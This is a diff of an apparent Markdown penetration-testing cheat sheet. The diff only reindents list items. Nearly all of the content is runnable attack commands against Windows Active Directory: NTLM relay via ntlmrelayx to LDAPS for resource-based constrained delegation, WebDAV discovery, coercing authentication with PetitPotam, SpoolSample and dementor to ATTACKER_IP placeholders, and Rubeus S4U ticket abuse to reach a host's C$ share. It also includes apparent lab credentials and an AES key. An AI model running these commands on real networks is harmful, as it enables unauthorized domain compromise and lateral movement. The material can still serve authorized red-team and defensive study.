@@ -14,40 +14,40 @@
 
 #### 3) Prepare for RBCD against the DC: 
 
- - python3 ntlmrelayx.py -t ldaps://dc --delegateaccess -smb2support
+    python3 ntlmrelayx.py -t ldaps://dc --delegateaccess -smb2support
 
 #### 4) Discover WebDAV services
 
- - webclientservicescanner 'domain.local'/'user':'password'@'machine'
+    webclientservicescanner 'domain.local'/'user':'password'@'machine'
 
- - crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
+    crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
 
- - GetWebDAVStatus.exe 'machine'
+    GetWebDAVStatus.exe 'machine'
 
 #### 5) Trigger the authentication to relay to our ntlmrelayx:
 
- - PetitPotam.exe WINUBNW4FI3AP0@80/test.txt 10.0.0.4
+    PetitPotam.exe WINUBNW4FI3AP0@80/test.txt 10.0.0.4
 
 ### the listener host must be specified with the FQDN or full netbios name like logger.domain.local@80/test.txt . Specifying the IP results in anonymous auth instead of System.
 
 ## PrinterBug
 
- - dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
+    dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
 
- - SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
+    SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
 
 ## PetitPotam
 
- - Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+    Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
 
- - Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.
+    Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.
  
- - PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+    PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
 
 #### 6) Use the created account to ask for a service ticket:
 
- - .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
+    .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
 
- - .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F
+    .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F
 
- - ls \\PC1.purple.lab\c$
+    ls \\PC1.purple.lab\c$
